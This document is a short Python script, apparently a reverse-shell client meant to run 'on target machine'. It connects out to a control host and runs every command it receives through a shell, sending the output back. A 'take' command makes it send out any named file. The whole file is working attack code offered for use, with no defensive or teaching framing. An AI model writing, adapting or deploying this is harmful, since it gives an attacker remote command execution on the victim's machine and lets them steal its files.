import socket
import subprocess
import os

def transfer_files(s, path):
    if os.path.exists(path):
        file = open(path, 'rb')
        packet = file.read(1024)

        while len(packet) > 0:
            s.send(packet)
            packet = file.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

# script to execute on target machine
def init_client():
    try:
        s = socket.socket()
        s.connect(('localhost', 8080)) # set to control host ip

        while True: 
            cmd = s.recv(1024)

            if 'exit' in cmd.decode():
                s.close()
                break
            elif 'take' in cmd.decode():
                take, path = cmd.decode().split('*')
                try:
                    transfer_files(s, path)
                except:
                    pass
            else:
                output = subprocess.Popen(cmd.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                s.send(output.stdout.read())
                s.send(output.stdout.read())

    except Exception as err:
        print('There was a problem with the connection', err)

init_client()